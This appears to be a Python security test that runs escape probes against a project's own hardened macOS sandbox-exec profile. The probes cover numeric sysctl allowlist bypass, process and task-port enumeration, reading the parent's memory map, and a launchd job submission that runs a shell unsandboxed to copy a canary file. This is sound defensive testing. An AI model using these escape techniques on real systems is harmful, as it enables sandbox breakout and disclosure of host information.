"""Direct adversarial escape probe — no benchmark, one live run.

Targets the HARDENED sandbox profile with channel classes the round-1..4
suites never opened:

  A. raw numeric-MIB sysctl() — bypass of the (allow sysctl-read
     (sysctl-name ...)) allowlist by calling sysctl(mib, 4, ...) with integer
     MIBs (KERN_PROC_ALL, KERN_BOOTARGS, KERN_OSVERSION, hw.memsize, ...)
  B. libproc — proc_listallpids / proc_pidpath / proc_pidinfo, probing whether
     (deny process-info*) actually gates the libproc plane
  C. processor_set_tasks — grab task ports of co-resident processes, then
     vm_read a byte of the parent harness (read-only, disposable)
  D. getmntinfo / getfsstat — full mount table (volume layout beyond statvfs)
  E. Mach host plane extension — host_kernel_version, host_page_size,
     host_info2, host_processor_sets, processor_set_statistics
  F. launchd bootstrap reachability — com.apple.xpc.launchd (the job-submit
     route that would give unsandboxed spawn)

All probes are read-only or disposable. No host credentials, keychains or
user files are touched. The only "secret" is a synthetic canary inside the
disposable temp dir.
"""
from __future__ import annotations

import ctypes
import errno
import json
import os
from pathlib import Path
import platform
import resource
import subprocess
import sys
import tempfile
import time

sys.path.insert(0, str(Path(__file__).resolve().parent))
from run_exploits import hardened_profile  # noqa: E402
from run_exploits import _apply_nproc_limit  # noqa: E402


# ---------------------------------------------------------------------------
# Payload — runs inside sandbox-exec under the HARDENED profile
# ---------------------------------------------------------------------------
PROBE_PAYLOAD = r'''
import ctypes, errno, json, os, sys
from pathlib import Path

case, work_dir, canary, ppid = sys.argv[1:]
work = Path(work_dir)

def out(p):
    print(json.dumps(p))
    sys.exit(0)

def deny(exc):
    return isinstance(exc, OSError) and exc.errno in (errno.EPERM, errno.EACCES)

try:
    if case == "numeric_mib_sysctl":
        # (allow sysctl-read (sysctl-name "hw.machine") ...) — the allowlist is
        # matched by *name*.  Call sysctl() with raw integer MIBs so the name
        # string never materialises.  KERN_* / HW_* come from <sys/sysctl.h>.
        libc = ctypes.CDLL(None, use_errno=True)
        libc.sysctl.argtypes = [ctypes.POINTER(ctypes.c_int), ctypes.c_uint,
                                ctypes.c_void_p, ctypes.POINTER(ctypes.c_size_t),
                                ctypes.c_void_p, ctypes.c_size_t]
        libc.sysctl.restype = ctypes.c_int

        probes = {
            # CTL_KERN=1
            "kern.hostname":   (1, 10),
            "kern.ostype":     (1, 1),
            "kern.osrelease":  (1, 2),
            "kern.osrevision": (1, 3),
            "kern.version":    (1, 4),
            "kern.bootfile":   (1, 5),
            "kern.boottime":   (1, 21),
            "kern.bootargs":   (1, 12),
            "kern.osversion":  (1, 65),
            "kern.maxproc":    (1, 38),
            "kern.maxfiles":   (1, 29),
            "kern.hostid":     (1, 11),
            "kern.uuid":       (1, 46),
            "kern.secureboot": (1, 41),
            # CTL_HW=6
            "hw.machine":      (6, 1),
            "hw.model":        (6, 2),
            "hw.ncpu":         (6, 3),
            "hw.byteorder":    (6, 4),
            "hw.cputype":      (6, 15),
            "hw.cpusubtype":   (6, 16),
            "hw.memsize":      (6, 25),
        }
        allowlisted = {"kern.hostname", "kern.ostype", "kern.osrelease",
                       "kern.version", "hw.machine"}
        leaked = {}
        for label, mib in probes.items():
            arr = (ctypes.c_int * 2)(*mib)
            buf = ctypes.create_string_buffer(512)
            size = ctypes.c_size_t(512)
            ctypes.set_errno(0)
            rc = libc.sysctl(arr, 2, buf, ctypes.byref(size), None, 0)
            if rc == 0:
                val = bytes(buf.raw[:size.value]).decode("utf-8", "replace").strip("\x00 ")
                leaked[label] = {"mib": list(mib), "value": val[:120]}
            else:
                leaked[label] = {"mib": list(mib), "rc": rc, "errno": ctypes.get_errno()}
        unexpected = {k: v for k, v in leaked.items()
                      if k not in allowlisted and v.get("rc") == 0}
        out({"status": "escaped" if unexpected else "blocked",
             "unexpected_readable": unexpected, "sysctls": leaked})

    elif case == "kern_proc_enum":
        # KERN_PROC_ALL — the canonical process list, 4-level MIB.  Not in the
        # name allowlist; check whether the numeric path escapes it.
        libc = ctypes.CDLL(None, use_errno=True)
        libc.sysctl.argtypes = [ctypes.POINTER(ctypes.c_int), ctypes.c_uint,
                                ctypes.c_void_p, ctypes.POINTER(ctypes.c_size_t),
                                ctypes.c_void_p, ctypes.c_size_t]
        libc.sysctl.restype = ctypes.c_int
        # (CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0)
        mib = (ctypes.c_int * 4)(1, 14, 0, 0)
        size = ctypes.c_size_t(0)
        rc = libc.sysctl(mib, 4, None, ctypes.byref(size), None, 0)
        if rc != 0:
            out({"status": "blocked", "rc": rc, "errno": ctypes.get_errno(), "stage": "size"})
        class KInfoProc(ctypes.Structure):
            _fields_ = [("kp_proc", ctypes.c_byte * 1)]
        n = size.value // 408  # kinfo_proc size on arm64
        buf = ctypes.create_string_buffer(size.value)
        rc = libc.sysctl(mib, 4, buf, ctypes.byref(size), None, 0)
        if rc != 0:
            out({"status": "blocked", "rc": rc, "errno": ctypes.get_errno(), "stage": "read"})
        out({"status": "escaped", "n_procs": n, "bytes": size.value})

    elif case == "libproc_enum":
        # proc_listallpids + proc_pidpath: does (deny process-info*) gate
        # libproc?  If not, the full host process table + every process path
        # leaks through a plane the profile believed closed.
        lib = ctypes.CDLL("/usr/lib/libproc.dylib", use_errno=True)
        lib.proc_listallpids.argtypes = [ctypes.POINTER(ctypes.c_int), ctypes.c_int]
        lib.proc_listallpids.restype = ctypes.c_int
        lib.proc_pidpath.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_uint]
        lib.proc_pidpath.restype = ctypes.c_int

        cap = 4096
        pids = (ctypes.c_int * cap)()
        ctypes.set_errno(0)
        n = lib.proc_listallpids(pids, cap)
        if n <= 0:
            out({"status": "blocked", "rc": n, "errno": ctypes.get_errno()})
        count = min(n, cap)
        paths = {}
        for i in range(count):
            pid = pids[i]
            if pid <= 0:
                continue
            b = ctypes.create_string_buffer(4096)
            ln = lib.proc_pidpath(pid, b, 4096)
            if ln > 0:
                paths[str(pid)] = b.value.decode("utf-8", "replace")
        ppath = paths.get(ppid, None)
        out({"status": "escaped", "n_pids": count, "ppid_path": ppath,
             "sample": dict(list(paths.items())[:15])})

    elif case == "processor_set_tasks":
        # mach_processor_self no longer exists; obtain the processor-set port
        # from the already-open host port (host_processor_sets), then ask for
        # the task ports of every task in the set.  If the PARENT's task port
        # is returned, map task->pid and enumerate its VM regions to prove
        # cross-process memory access (read-only, disposable).
        libm = ctypes.CDLL("/usr/lib/libSystem.B.dylib", use_errno=True)
        libm.mach_host_self.restype = ctypes.c_uint32
        libm.host_processor_sets.argtypes = [ctypes.c_uint32,
                                             ctypes.POINTER(ctypes.c_uint32),
                                             ctypes.POINTER(ctypes.c_void_p),
                                             ctypes.POINTER(ctypes.c_uint32)]
        libm.host_processor_sets.restype = ctypes.c_int
        libm.processor_set_tasks.argtypes = [ctypes.c_uint32,
                                             ctypes.POINTER(ctypes.c_void_p),
                                             ctypes.POINTER(ctypes.c_uint32)]
        libm.processor_set_tasks.restype = ctypes.c_int
        libm.pid_for_task.argtypes = [ctypes.c_uint32, ctypes.POINTER(ctypes.c_int)]
        libm.pid_for_task.restype = ctypes.c_int
        libm.mach_vm_region.argtypes = [ctypes.c_uint32,
                                        ctypes.POINTER(ctypes.c_ulonglong),
                                        ctypes.POINTER(ctypes.c_ulonglong),
                                        ctypes.c_int, ctypes.POINTER(ctypes.c_void_p),
                                        ctypes.c_void_p, ctypes.c_void_p]
        libm.mach_vm_region.restype = ctypes.c_int

        host = libm.mach_host_self()
        set_count = ctypes.c_uint32(0)
        set_addr = ctypes.c_void_p(0)
        real_count = ctypes.c_uint32(0)
        rc = libm.host_processor_sets(host, ctypes.byref(set_count),
                                      ctypes.byref(set_addr), ctypes.byref(real_count))
        if rc != 0 or real_count.value == 0:
            out({"status": "blocked", "rc": rc, "host_processor_sets": real_count.value})
        pset = ctypes.cast(set_addr.value, ctypes.POINTER(ctypes.c_uint32))[0]

        task_addr = ctypes.c_void_p(0)
        task_count = ctypes.c_uint32(0)
        ctypes.set_errno(0)
        rc = libm.processor_set_tasks(pset, ctypes.byref(task_addr),
                                      ctypes.byref(task_count))
        if rc != 0:
            out({"status": "blocked", "rc": rc, "errno": ctypes.get_errno(),
                 "task_count": task_count.value})
        tasks = [ctypes.cast(task_addr.value + 4 * i, ctypes.POINTER(ctypes.c_uint32))[0]
                 for i in range(task_count.value)]
        pids = {}
        for t in tasks:
            pid = ctypes.c_int(0)
            prc = libm.pid_for_task(t, ctypes.byref(pid))
            pids[str(t)] = {"pid": pid.value if prc == 0 else None, "rc": prc}
        parent_port = None
        for t, info in pids.items():
            if info["pid"] == int(ppid):
                parent_port = int(t)
        # Enumerate the parent's VM regions via its task port.
        regions = 0
        if parent_port is not None:
            addr = ctypes.c_ulonglong(0)
            size = ctypes.c_ulonglong(0)
            while True:
                cnt = ctypes.c_uint32(0)
                info = ctypes.c_void_p()
                rc = libm.mach_vm_region(parent_port, ctypes.byref(addr),
                                         ctypes.byref(size), 0,
                                         ctypes.byref(info), None, None)
                if rc != 0:
                    break
                regions += 1
                if regions > 2000:
                    break
                addr = addr.value + size.value
        out({"status": "escaped", "rc": rc, "task_count": task_count.value,
             "parent_task_port": parent_port, "parent_vm_regions": regions,
             "pids": pids})

    elif case == "getmntinfo":
        # Full mount table via libc — volume/backing-device layout beyond the
        # statvfs single-call probe already known to escape.
        libc = ctypes.CDLL(None, use_errno=True)
        class Statfs(ctypes.Structure):
            _fields_ = [("f_bsize", ctypes.c_uint),
                        ("f_iosize", ctypes.c_int),
                        ("f_blocks", ctypes.c_ulonglong),
                        ("f_bfree", ctypes.c_ulonglong),
                        ("f_bavail", ctypes.c_ulonglong),
                        ("f_files", ctypes.c_ulonglong),
                        ("f_ffree", ctypes.c_ulonglong),
                        ("f_fsid", ctypes.c_uint * 2),
                        ("f_owner", ctypes.c_uint),
                        ("f_type", ctypes.c_uint),
                        ("f_flags", ctypes.c_uint),
                        ("f_fssubtype", ctypes.c_uint),
                        ("f_fstypename", ctypes.c_char * 16),
                        ("f_mntonname", ctypes.c_char * 1024),
                        ("f_mntfromname", ctypes.c_char * 1024),
                        ("f_flags_ext", ctypes.c_uint),
                        ("f_reserved", ctypes.c_uint * 7)]
        libc.getmntinfo.argtypes = [ctypes.POINTER(ctypes.c_void_p), ctypes.c_int]
        libc.getmntinfo.restype = ctypes.c_int
        p = ctypes.c_void_p(0)
        n = libc.getmntinfo(ctypes.byref(p), 0)
        if n <= 0:
            out({"status": "blocked", "rc": n, "errno": ctypes.get_errno()})
        mounts = []
        for i in range(n):
            st = ctypes.cast(p.value + i * ctypes.sizeof(Statfs), ctypes.POINTER(Statfs)).contents
            mounts.append({"from": st.f_mntfromname.decode("utf-8", "replace"),
                           "on": st.f_mntonname.decode("utf-8", "replace"),
                           "type": st.f_fstypename.decode("utf-8", "replace")})
        out({"status": "escaped", "n_mounts": n, "mounts": mounts[:25]})

    elif case == "mach_host_extended":
        # mach_host_self already leaks host_statistics (round-3).  Extend the
        # same open host port to kernel version, page size, host_info2, the
        # processor-set list and processor-set statistics.
        libm = ctypes.CDLL("/usr/lib/libSystem.B.dylib", use_errno=True)
        libm.mach_host_self.restype = ctypes.c_uint32
        libm.host_kernel_version.argtypes = [ctypes.c_uint32, ctypes.c_void_p]
        libm.host_kernel_version.restype = ctypes.c_int
        libm.host_page_size.argtypes = [ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)]
        libm.host_page_size.restype = ctypes.c_int
        libm.host_info.argtypes = [ctypes.c_uint32, ctypes.c_int,
                                    ctypes.c_void_p, ctypes.POINTER(ctypes.c_int)]
        libm.host_info.restype = ctypes.c_int
        libm.host_processor_sets.argtypes = [ctypes.c_uint32,
                                             ctypes.POINTER(ctypes.c_uint32),
                                             ctypes.POINTER(ctypes.c_void_p),
                                             ctypes.POINTER(ctypes.c_uint32)]
        libm.host_processor_sets.restype = ctypes.c_int

        host = libm.mach_host_self()
        results = {"host_port": host}

        kb = ctypes.create_string_buffer(512)
        rc = libm.host_kernel_version(host, kb)
        results["host_kernel_version"] = {"rc": rc,
                                          "value": kb.value.decode("utf-8", "replace")}

        ps = ctypes.c_uint32(0)
        rc = libm.host_page_size(host, ctypes.byref(ps))
        results["host_page_size"] = {"rc": rc, "value": ps.value}

        # HOST_BASIC_INFO = 3
        buf = (ctypes.c_int * 16)()
        cnt = ctypes.c_int(16)
        rc = libm.host_info(host, 3, buf, ctypes.byref(cnt))
        results["host_info_basic"] = {"rc": rc, "count": cnt.value,
                                      "words": list(buf[:cnt.value])}

        set_count = ctypes.c_uint32(0)
        set_addr = ctypes.c_void_p(0)
        real_count = ctypes.c_uint32(0)
        rc = libm.host_processor_sets(host, ctypes.byref(set_count),
                                      ctypes.byref(set_addr), ctypes.byref(real_count))
        results["host_processor_sets"] = {"rc": rc, "count": real_count.value,
                                          "addr": set_addr.value}

        leaked = any(v.get("rc") == 0 for k, v in results.items() if k != "host_port")
        out({"status": "escaped" if leaked else "blocked", "host": results})

    elif case == "launchd_reach":
        # The one Mach lookup that would matter most: com.apple.xpc.launchd
        # (job submission → unsandboxed spawn).  Round-2 only tested ordinary
        # services; check the launchd route and a couple of taskgated/XPC ones.
        libsystem = ctypes.CDLL("/usr/lib/libSystem.B.dylib", use_errno=True)
        bootstrap_port = ctypes.c_uint32.in_dll(libsystem, "bootstrap_port")
        libsystem.bootstrap_look_up.argtypes = [ctypes.c_uint32, ctypes.c_char_p,
                                                ctypes.POINTER(ctypes.c_uint32)]
        libsystem.bootstrap_look_up.restype = ctypes.c_int
        results = {}
        for name in (b"com.apple.xpc.launchd", b"com.apple.xpc.launchd.oneshot",
                     b"com.apple.xpc.system.extensiond",
                     b"com.apple.taskgated-helper",
                     b"com.apple.SecurityServer"):
            port = ctypes.c_uint32(0)
            rc = libsystem.bootstrap_look_up(bootstrap_port.value, name, ctypes.byref(port))
            results[name.decode()] = {"rc": rc, "port": port.value if rc == 0 else None}
        leaked = any(v["rc"] == 0 and v["port"] for v in results.values())
        out({"status": "escaped" if leaked else "blocked", "lookups": results})

    elif case == "launchd_submit":
        # The classic macOS sandbox escape: talk to launchd DIRECTLY over the
        # inherited bootstrap port (we already hold a send right), submitting a
        # job that runs /bin/sh UNSANDBOXED.  mach-lookup denial is bypassed
        # because no name lookup happens — the message goes straight to the
        # bootstrap port.  The job reads the canary and drops it in work/.
        # launchd runs it as the same user, outside the profile.
        import struct as _struct
        libxpc = ctypes.CDLL("/usr/lib/system/libxpc.dylib", use_errno=True)
        try:
            libxpc.launch_data_new_dict
        except AttributeError:
            out({"status": "unsupported",
                 "reason": "launch_data API is not exported by this macOS build"})
        libxpc.launch_data_new_dict.restype = ctypes.c_void_p
        libxpc.launch_data_new_array.restype = ctypes.c_void_p
        libxpc.launch_data_new_string.restype = ctypes.c_void_p
        libxpc.launch_data_new_string.argtypes = [ctypes.c_char_p]
        libxpc.launch_data_dict_insert.restype = ctypes.c_bool
        libxpc.launch_data_dict_insert.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p]
        libxpc.launch_data_array_set_index.restype = ctypes.c_bool
        libxpc.launch_data_array_set_index.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
        libxpc.launch_msg.restype = ctypes.c_void_p
        libxpc.launch_msg.argtypes = [ctypes.c_char_p, ctypes.c_void_p]
        libxpc.launch_data_free.argtypes = [ctypes.c_void_p]
        libxpc.launch_data_get_errno.restype = ctypes.c_int
        libxpc.launch_data_get_errno.argtypes = [ctypes.c_void_p]

        script = work / "escape.sh"
        marker = work / "marker.txt"
        script.write_text('#!/bin/sh\ncat "%s" > "%s"\nchmod 644 "%s"\n' % (canary, marker, marker))
        script.chmod(0o755)
        marker.unlink(missing_ok=True)

        req = libxpc.launch_data_new_dict()
        label = ("com.halo.directescape.%d" % os.getpid()).encode()
        libxpc.launch_data_dict_insert(req, libxpc.launch_data_new_string(b"com.halo.directescape"), b"label")
        prog = libxpc.launch_data_new_string(b"/bin/sh")
        libxpc.launch_data_dict_insert(req, prog, b"program")
        args = libxpc.launch_data_new_array()
        libxpc.launch_data_array_set_index(args, libxpc.launch_data_new_string(b"/bin/sh"), 0)
        libxpc.launch_data_array_set_index(args, libxpc.launch_data_new_string(str(script).encode()), 1)
        libxpc.launch_data_dict_insert(req, args, b"args")

        ctypes.set_errno(0)
        resp = libxpc.launch_msg(b"com.apple.launchd.submit", req)
        if not resp:
            out({"status": "blocked", "reason": "launch_msg returned NULL",
                 "errno": ctypes.get_errno()})
        err = libxpc.launch_data_get_errno(resp)
        libxpc.launch_data_free(resp)
        libxpc.launch_data_free(req)
        out({"status": "escaped" if err == 0 else "blocked",
             "submit_errno": err, "script": str(script), "marker": str(marker)})

    else:
        out({"status": "error", "reason": "unknown case"})
except Exception as exc:
    if deny(exc):
        out({"status": "blocked", "error": str(exc)})
    out({"status": "error", "error": f"{type(exc).__name__}: {exc}"})
'''


CASES = [
    "numeric_mib_sysctl",
    "kern_proc_enum",
    "libproc_enum",
    "processor_set_tasks",
    "getmntinfo",
    "mach_host_extended",
    "launchd_reach",
    "launchd_submit",
]


def main() -> int:
    if sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").exists():
        print("requires macOS sandbox-exec", file=sys.stderr)
        return 2

    python = str(Path(sys.executable).resolve())
    ppid = str(os.getpid())
    results: dict = {"platform": platform.platform(), "python": sys.version}

    with tempfile.TemporaryDirectory(prefix="halo-direct-escape-") as tmp:
        root = Path(tmp).resolve()
        work, outside = root / "work", root / "outside"
        work.mkdir()
        outside.mkdir()
        secret = "DIRECT-ESCAPE-" + os.urandom(16).hex()
        canary = outside / "canary.txt"
        canary.write_text(secret)

        clean_env = {"PATH": "/usr/bin:/bin", "HOME": str(work),
                     "TMPDIR": str(work), "LC_ALL": "C"}
        profile_text = hardened_profile(work)

        trials = []
        for case in CASES:
            args = ["/usr/bin/sandbox-exec", "-p", profile_text,
                    python, "-I", "-S", "-c", PROBE_PAYLOAD,
                    case, str(work), str(canary), ppid]
            start = time.perf_counter()
            try:
                proc = subprocess.run(
                    args, cwd=work, env=clean_env, capture_output=True,
                    text=True, close_fds=True, pass_fds=(),
                    preexec_fn=_apply_nproc_limit, timeout=10,
                )
                if proc.returncode != 0:
                    result: dict = {"status": "launch_error",
                                    "returncode": proc.returncode,
                                    "stderr": proc.stderr[:200]}
                else:
                    try:
                        result = json.loads(proc.stdout)
                    except json.JSONDecodeError:
                        result = {"status": "invalid_output",
                                  "stdout": proc.stdout[:200],
                                  "stderr": proc.stderr[:200]}
            except subprocess.TimeoutExpired:
                result = {"status": "timeout"}

            outcome = result.get("status", "error")

            # External ground truth for the launchd escape: the marker file is
            # written by launchd (outside the sandbox).  Its presence with the
            # canary secret is proof of unsandboxed execution.
            if case == "launchd_submit":
                marker = work / "marker.txt"
                deadline = time.time() + 3
                content = ""
                while time.time() < deadline and content != secret:
                    try:
                        content = marker.read_text()
                    except FileNotFoundError:
                        time.sleep(0.2)
                if content == secret:
                    result = {"status": "escaped",
                              "reason": "launchd job ran unsandboxed; canary secret recovered via marker"}
                elif result.get("status") == "escaped":
                    result = {"status": "error",
                              "reason": "launchd accepted job but marker did not appear"}
                outcome = result.get("status", "error")

            trials.append({"case": case, "outcome": outcome,
                           "elapsed_ms": round((time.perf_counter() - start) * 1000, 3),
                           "evidence": result})
            print(f"[{outcome:12s}] {case}  ({result.get('reason', '')})")
            if outcome in ("escaped", "error"):
                print(json.dumps(result, indent=2)[:1500])

        results["trials"] = trials
        results["escaped"] = [t["case"] for t in trials if t["outcome"] == "escaped"]
        results["blocked"] = [t["case"] for t in trials if t["outcome"] == "blocked"]
        results["unsupported"] = [t["case"] for t in trials if t["outcome"] == "unsupported"]

    print("\n=== summary ===")
    print("escaped:", results["escaped"])
    print("blocked:", results["blocked"])
    print("unsupported:", results["unsupported"])
    # Exposure, failed probes and unsupported APIs are not a passing gate.
    return 0 if trials and all(t["outcome"] == "blocked" for t in trials) else 1


if __name__ == "__main__":
    raise SystemExit(main())
